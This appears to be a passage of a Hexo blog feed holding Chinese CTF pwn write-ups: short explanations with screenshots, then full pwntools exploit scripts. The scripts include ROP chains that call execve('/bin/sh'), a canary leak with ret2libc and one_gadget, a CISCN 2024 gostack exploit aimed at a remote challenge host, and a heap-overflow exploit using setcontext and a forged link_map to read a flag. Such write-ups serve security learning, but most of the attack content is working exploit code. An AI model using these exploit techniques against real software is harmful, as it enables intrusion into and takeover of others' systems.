class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#bss read</span></span><br><span class="line">payload=<span class="string">b'\x00'</span>*<span class="number">0x1d0</span>+p64(pop_rdi_r14)+p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">payload+=p64(pop_rsi)+p64(bss)+p64(pop_rdx)+p64(<span class="number">8</span>)+p64(pop_rax)+p64(<span class="number">0</span>)+p64(syscall_ret)</span><br><span class="line"></span><br><span class="line"><span class="comment">#exceve</span></span><br><span class="line">payload+=p64(pop_rdi_r14)+p64(bss)+p64(<span class="number">0</span>)*<span class="number">5</span>+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rdx)+p64(<span class="number">0</span>)+p64(pop_rax)+p64(<span class="number">0x3b</span>)+p64(syscall_ret)</span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line">p.sendlineafter(<span class="string">'magic message :'</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pstack</title>
      <link href="//posts/3d6a2015/"/>
      <url>//posts/3d6a2015/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>武功论剑</title>
      <link href="//posts/6ca732a0/"/>
      <url>//posts/6ca732a0/</url>
      
        <content type="html"><![CDATA[<p>一道很简单的apk题，反汇编出来，将两个数组的值一一异或就得到flag</p><p><img src="https://s2.loli.net/2024/07/27/dlFW9we6XxpRzNV.png" alt="image-20240727135021283"></p><p>这道简单的栈溢出题，开了canary保护</p><p>这里输入0x49个字节可以将canary和rbp打印出来</p><p><img src="https://s2.loli.net/2024/07/27/37YWbzvPcIiJ1H2.png" alt="image-20240727141257896"></p><p>主函数有个栈溢出漏洞，这里ret2libc泄露puts的got表地址，再返回重新输入一次</p><p><img src="https://s2.loli.net/2024/07/27/LGPVpf3ImUwqYdZ.png" alt="image-20240727141435162"></p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote("59.62.61.30",46489)</span></span><br><span class="line">p=process(<span class="string">"./pwn"</span>)</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">libc=ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x400853</span></span><br><span class="line">puts_got=<span class="number">0x601018</span></span><br><span class="line">call_puts=<span class="number">0x4007af</span></span><br><span class="line">payload=<span class="string">b'a'</span>*<span class="number">0x48</span>+<span class="string">b'b'</span></span><br><span class="line">puts_plt=<span class="number">0x400580</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">'b'</span>)</span><br><span class="line"></span><br><span class="line">canary=u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line">rbp_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'rbp'</span>+<span class="built_in">hex</span>(rbp_addr))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b'b'</span>*<span class="number">0x48</span>+p64(canary)+p64(rbp_addr-<span class="number">0x50</span>)</span><br><span class="line">payload+=p64(pop_rdi)+p64(puts_got)+p64(call_puts)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'overflow!'</span>,payload)</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">puts=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line">base=puts-libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">system=base+libc.sym[<span class="string">'system'</span>]</span><br><span class="line">binsh=base+<span class="built_in">next</span>(libc.search(<span class="string">b'bin/sh'</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'puts'</span>+<span class="built_in">hex</span>(puts))</span><br><span class="line">one=[<span class="number">0x4f3d5</span>,<span class="number">0x4f432</span>,<span class="number">0x10a41c</span>]</span><br><span class="line">one_gadget=base+one[<span class="number">0</span>]</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">p.recvline()</span><br><span class="line">payload=<span class="string">b'a'</span>*<span class="number">0x48</span>+p64(canary)+<span class="string">b'a'</span>*<span class="number">8</span>+p64(one_gadget)</span><br><span class="line"><span class="comment">#+p64(pop_rdi)+p64(binsh)+p64(system)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_pwn</title>
      <link href="//posts/344ab8fb/"/>
      <url>//posts/344ab8fb/</url>
      
        <content type="html"><![CDATA[<h2 id="第一天-gostack"><a href="#第一天-gostack" class="headerlink" title="第一天_gostack"></a>第一天_gostack</h2><h5 id="64位的静态编译题"><a href="#64位的静态编译题" class="headerlink" title="64位的静态编译题"></a>64位的静态编译题</h5><p><img src="https://s2.loli.net/2024/05/19/xeACKin2JEw7B8X.png" alt="image-20240519162316093"></p><p><img src="https://s2.loli.net/2024/05/19/5HwmgvtCEARJojT.png" alt="image-20240519162532844"></p><h5 id="很明显的syscall和很多可以利用的gadget"><a href="#很明显的syscall和很多可以利用的gadget" class="headerlink" title="很明显的syscall和很多可以利用的gadget"></a>很明显的syscall和很多可以利用的gadget</h5><p><img src="https://s2.loli.net/2024/05/19/lAQMKgWLYoJOx2n.png" alt="image-20240519162808628"></p><p><img src="https://s2.loli.net/2024/05/19/WIfjVbrg7SMcAPh.png" alt="image-20240519162853532"></p><h5 id="利用syscall向bss段写入-bin-sh，再syscall执行execve-‘bin-sh’-0-0-拿到flag"><a href="#利用syscall向bss段写入-bin-sh，再syscall执行execve-‘bin-sh’-0-0-拿到flag" class="headerlink" title="利用syscall向bss段写入 bin/sh，再syscall执行execve(‘bin/sh’,0,0),拿到flag"></a>利用syscall向bss段写入 bin/sh，再syscall执行execve(‘bin/sh’,0,0),拿到flag</h5><p><img src="https://s2.loli.net/2024/05/19/PIrL94hM2jltmno.png" alt="image-20240519163321686"></p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">"8.147.134.47"</span>,<span class="number">16589</span>)</span><br><span class="line"><span class="comment">#p=process("./gostack")</span></span><br><span class="line">elf=ELF(<span class="string">'./gostack'</span>)</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"><span class="comment"># Gadgets and syscall addresses</span></span><br><span class="line">syscall_address = <span class="number">0x404043</span></span><br><span class="line">rax_ret_address = <span class="number">0x40f984</span></span><br><span class="line">rdi_6_ret_address = <span class="number">0x4a18a5</span></span><br><span class="line">rsi_ret_address = <span class="number">0x42138a</span></span><br><span class="line">rdx_ret_address = <span class="number">0x4944ec</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Create the payload</span></span><br><span class="line">payload = <span class="string">b'a'</span> * <span class="number">0x100</span></span><br><span class="line">payload += p64(elf.bss()) + p64(<span class="number">0x10</span>) + p64(<span class="number">0</span>) * <span class="number">0x18</span></span><br><span class="line">payload += p64(rdi_6_ret_address) + p64(<span class="number">0</span>) * <span class="number">6</span></span><br><span class="line">payload += p64(rsi_ret_address) + p64(elf.bss() + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(rdx_ret_address) + p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(rax_ret_address) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_address)</span><br><span class="line">payload += p64(rdi_6_ret_address) + p64(elf.bss() + <span class="number">0x200</span>) + p64(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">payload += p64(rdi_6_ret_address) + p64(elf.bss() + <span class="number">0x200</span>) + p64(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">payload += p64(rdi_6_ret_address) + p64(elf.bss() + <span class="number">0x200</span>) + p64(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">payload += p64(rsi_ret_address) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(rdx_ret_address) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(rax_ret_address) + p64(<span class="number">0x3b</span>)</span><br><span class="line">payload += p64(syscall_address)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Send the payload</span></span><br><span class="line">p.sendlineafter(<span class="string">'message :\n'</span>, payload)</span><br><span class="line"><span class="built_in">input</span>()</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><h2 id="EzHeap"><a href="#EzHeap" class="headerlink" title="EzHeap"></a>EzHeap</h2><p><img src="https://s2.loli.net/2024/05/19/tjciLKWbQEsTOF2.png" alt="image-20240519164039631"></p><h5 id="edit函数存在堆溢出"><a href="#edit函数存在堆溢出" class="headerlink" title="edit函数存在堆溢出"></a>edit函数存在堆溢出</h5><p><img src="https://s2.loli.net/2024/05/19/WyVCcLqEt6MK45J.png" alt="image-20240519164143452"></p><h5 id="开启了沙箱保护-这是一道堆的orw。"><a href="#开启了沙箱保护-这是一道堆的orw。" class="headerlink" title="开启了沙箱保护,这是一道堆的orw。"></a>开启了沙箱保护,这是一道堆的orw。</h5><p><img src="https://s2.loli.net/2024/05/19/EVw45MF9RsYUeTp.png" alt="image-20240519164437835"></p><h5 id="泄露出堆的基地址"><a href="#泄露出堆的基地址" class="headerlink" title="泄露出堆的基地址"></a>泄露出堆的基地址</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add_chunk(<span class="number">0x28</span>)</span><br><span class="line">add_chunk(<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Edit and leak heap address</span></span><br><span class="line">edit_chunk(<span class="number">0</span>, <span class="number">0x50</span>, <span class="string">b'a'</span> * <span class="number">0x50</span>)</span><br><span class="line">show_chunk(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">b'a'</span> * <span class="number">0x50</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line">heap_leak = u64(io.recvuntil(<span class="string">b'Welcome to CISCN 2024!'</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">heap_base = heap_leak &lt;&lt; <span class="number">12</span></span><br></pre></td></tr></tbody></table></figure><p><img src="https://s2.loli.net/2024/05/19/eM7kiyhCDB5rKgT.png" alt="image-20240519165038422"></p><h5 id="将free-hook改成setcontext-通过setcontext控制rsp进而orw-构造rop最后获得flag"><a href="#将free-hook改成setcontext-通过setcontext控制rsp进而orw-构造rop最后获得flag" class="headerlink" title="将free_hook改成setcontext,通过setcontext控制rsp进而orw,构造rop最后获得flag"></a>将free_hook改成setcontext,通过setcontext控制rsp进而orw,构造rop最后获得flag</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./EzHeap"</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">io=process(<span class="string">'EzHeap'</span>)</span><br><span class="line"><span class="comment">#io = remote('8.147.129.121', 26987)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_chunk</span>(<span class="params">size, content=<span class="string">b''</span></span>):</span><br><span class="line">    io.sendlineafter(<span class="string">"choice &gt;&gt; "</span>, <span class="string">'1'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"size:"</span>, <span class="built_in">str</span>(<span class="built_in">int</span>(size)))</span><br><span class="line">    io.sendafter(<span class="string">"content:"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_chunk</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">"choice &gt;&gt; "</span>, <span class="string">'2'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"idx:"</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_chunk</span>(<span class="params">index, size, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">"choice &gt;&gt; "</span>, <span class="string">'3'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"idx:"</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">"size:"</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">"content:"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_chunk</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">"choice &gt;&gt; "</span>, <span class="string">'4'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"idx:"</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit_program</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">"choice &gt;&gt; "</span>, <span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Add initial chunks</span></span><br><span class="line">add_chunk(<span class="number">0x28</span>)</span><br><span class="line">add_chunk(<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Edit and leak heap address</span></span><br><span class="line">edit_chunk(<span class="number">0</span>, <span class="number">0x50</span>, <span class="string">b'a'</span> * <span class="number">0x50</span>)</span><br><span class="line">show_chunk(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">b'a'</span> * <span class="number">0x50</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line">heap_leak = u64(io.recvuntil(<span class="string">b'Welcome to CISCN 2024!'</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">heap_base = heap_leak &lt;&lt; <span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Edit chunk to set up fake chunk</span></span><br><span class="line">edit_chunk(<span class="number">0</span>, <span class="number">0x50</span>, <span class="string">b'\x00'</span> * <span class="number">0x28</span> + p64(<span class="number">0x21</span>) + <span class="string">b'\x00'</span> * <span class="number">0x18</span> + p64(<span class="number">0xd1</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Leak libc address</span></span><br><span class="line">edit_chunk(<span class="number">1</span>, <span class="number">0x30</span>, <span class="string">b'a'</span> * <span class="number">0x30</span>)</span><br><span class="line">show_chunk(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">b'a'</span> * <span class="number">0x30</span>)</span><br><span class="line">libc_leak = u64(io.recvuntil(<span class="string">b'\x7f'</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">libc_base = libc_leak - <span class="number">0x21ace0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Edit chunk to consolidate chunks</span></span><br><span class="line">edit_chunk(<span class="number">1</span>, <span class="number">0x30</span>, <span class="string">b'\x00'</span> * <span class="number">0x28</span> + p64(<span class="number">0xf1</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up libc addresses</span></span><br><span class="line">setcontext_address = libc_base + <span class="number">0x539e0</span> + <span class="number">61</span></span><br><span class="line">read_address = libc_base + <span class="number">0x1147d0</span></span><br><span class="line">write_address = libc_base + <span class="number">0x114870</span></span><br><span class="line">rtld_global_address = libc_base + <span class="number">0x285040</span></span><br><span class="line">rtld_3_address = libc_base + <span class="number">0x2865a0</span></span><br><span class="line"></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x2a3e5</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0xe7d0d</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x11f2e7</span>  <span class="comment"># r12</span></span><br><span class="line">ret = libc_base + <span class="number">0x1193c1</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x45eb0</span></span><br><span class="line">syscall = libc_base + <span class="number">0x91316</span></span><br><span class="line">target_address = ((heap_base + <span class="number">0x1e30</span>) &gt;&gt; <span class="number">12</span>) ^ rtld_global_address</span><br><span class="line"></span><br><span class="line"><span class="comment"># Add chunks to manipulate heap</span></span><br><span class="line">add_chunk(<span class="number">0x78</span>)  <span class="comment"># Chunk 2</span></span><br><span class="line">add_chunk(<span class="number">0x78</span>)  <span class="comment"># Chunk 3</span></span><br><span class="line">add_chunk(<span class="number">0x78</span>)  <span class="comment"># Chunk 4</span></span><br><span class="line">add_chunk(<span class="number">0x78</span>)  <span class="comment"># Chunk 5</span></span><br><span class="line">edit_chunk(<span class="number">5</span>, <span class="number">0x100</span>, <span class="string">b'a'</span> * <span class="number">0x78</span> + p64(<span class="number">0x21</span>) + p64(target_address))</span><br><span class="line">add_chunk(<span class="number">0x18</span>)  <span class="comment"># Chunk 6</span></span><br><span class="line">add_chunk(<span class="number">0x18</span>)  <span class="comment"># Chunk 7</span></span><br><span class="line">add_chunk(<span class="number">0x18</span>)  <span class="comment"># Chunk 8</span></span><br><span class="line">add_chunk(<span class="number">0x18</span>)  <span class="comment"># Chunk 9</span></span><br><span class="line">add_chunk(<span class="number">0x18</span>, p64(heap_base + <span class="number">0x300</span>) + p64(<span class="number">5</span>) + p64(rtld_3_address))</span><br><span class="line"></span><br><span class="line">heap_leak_adjusted = heap_base - <span class="number">0x650</span></span><br><span class="line">l_next_address = libc_base + <span class="number">0x286890</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Create link map</span></span><br><span class="line">link_map = p64(<span class="number">0</span>)</span><br><span class="line">link_map += p64(l_next_address)</span><br><span class="line">link_map += p64(<span class="number">0</span>)</span><br><span class="line">link_map += p64(heap_leak_adjusted + <span class="number">0x940</span>)</span><br><span class="line">link_map += p64(<span class="number">0</span>) * <span class="number">28</span></span><br><span class="line">link_map += p64(heap_leak_adjusted + <span class="number">0xa50</span>)</span><br><span class="line">link_map += p64(heap_leak_adjusted + <span class="number">0xa70</span>)</span><br><span class="line">link_map += p64(heap_leak_adjusted + <span class="number">0xa60</span>)</span><br><span class="line">link_map += p64(<span class="number">0x10</span>)</span><br><span class="line">link_map += p64(setcontext_address)</span><br><span class="line">link_map += p64(ret)</span><br><span class="line">link_map += p64(<span class="number">0</span>) * <span class="number">13</span></span><br><span class="line">link_map += p64(heap_leak_adjusted + <span class="number">0x200</span>)</span><br><span class="line">link_map += <span class="string">b'./flag'</span>.ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">link_map += p64(<span class="number">0</span>)</span><br><span class="line">link_map += p64(<span class="number">0x100</span>)</span><br><span class="line">link_map += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">link_map += p64(heap_leak_adjusted + <span class="number">0xc60</span>)</span><br><span class="line">link_map += p64(ret)</span><br><span class="line">link_map += p64(<span class="number">0</span>) * <span class="number">38</span></span><br><span class="line">link_map += p64(<span class="number">0x800000000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create ROP chain</span></span><br><span class="line">rop_chain = p64(ret) * <span class="number">0x1</span></span><br><span class="line">rop_chain += p64(pop_rdi) + p64(heap_leak_adjusted + <span class="number">0xaf0</span>)</span><br><span class="line">rop_chain += p64(pop_rax) + p64(<span class="number">2</span>)</span><br><span class="line">rop_chain += p64(pop_rsi) + p64(<span class="number">0</span>)</span><br><span class="line">rop_chain += p64(syscall)</span><br><span class="line"></span><br><span class="line">rop_chain += p64(pop_rdi) + p64(<span class="number">3</span>)</span><br><span class="line">rop_chain += p64(pop_rsi) + p64(heap_leak_adjusted + <span class="number">0x800</span>)</span><br><span class="line">rop_chain += p64(pop_rdx) + p64(<span class="number">0x50</span>) + p64(<span class="number">0</span>)</span><br><span class="line">rop_chain += p64(read_address)</span><br><span class="line">rop_chain += p64(pop_rdi) + p64(<span class="number">1</span>)</span><br><span class="line">rop_chain += p64(pop_rsi) + p64(heap_leak_adjusted + <span class="number">0x800</span>)</span><br><span class="line">rop_chain += p64(pop_rdx) + p64(<span class="number">0x50</span>) + p64(<span class="number">0</span>)</span><br><span class="line">rop_chain += p64(write_address)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Edit chunk with link map and ROP chain</span></span><br><span class="line">edit_chunk(<span class="number">0</span>, <span class="number">0x400</span>, link_map + rop_chain)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Exit and trigger the payload</span></span><br><span class="line">exit_program()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>easyshell</title>
      <link href="//posts/9ea1a33f/"/>
      <url>//posts/9ea1a33f/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">#p=remote("node4.buuoj.cn",)</span><br><span class="line">p=process("./babyheap")</span><br><span class="line">context.log_level="debug"</span><br><span class="line">libc=ELF('libc.so')</span><br><span class="line">elf=ELF('babyheap')</span><br><span class="line"></span><br><span class="line">p.recvuntil('captcha is: ')</span><br><span class="line">cap=p.recv(8)</span><br><span class="line">p.sendlineafter('the captcha: ',cap)</span><br><span class="line">#p.sendlineafter(</span><br><span class="line">#p.sendlineafter('Please Select: ',)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(index,size):</span><br><span class="line">p.sendlineafter('Please Select: ','1')</span><br><span class="line">p.sendlineafter('Index: ',str(index))</span><br><span class="line">p.sendlineafter('Size: ',str(size))</span><br><span class="line"></span><br><span class="line">def fill(size,content):</span><br><span class="line">p.sendlineafter('Please Select: ','3')</span><br><span class="line">p.sendlineafter('Size: ',str(size))</span><br><span class="line">p.sendlineafter('Content: ',content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">sleep(1)</span><br><span class="line">add(20,0x60)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>heap</title>
      <link href="//posts/bd2922e1/"/>
      <url>//posts/bd2922e1/</url>
      
        <content type="html"><![CDATA[<p>chunk就是一整个</p><p><img src="https://s2.loli.net/2024/05/14/f3vUmEAbwlS7J6j.png" alt="image-20240514230404731"></p><p> malloc返回的指针指向chunk的数据区域</p><p>free返回的指针指向chunk的header</p><p>pre_size只有在上一个chunk（物理相邻）是释放时才属于下一个chunk的区域，否则属于上一个chunk的</p><p>free_chunk的大小 0x20~0x0x80,malloc(8)得到的是0x20的chunk</p><p><img src="https://s2.loli.net/2024/05/14/Y7PbWRAnHrodXKG.png" alt="image-20240514230437610"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>note2</title>
      <link href="//posts/c0d78a/"/>
      <url>//posts/c0d78a/</url>
      
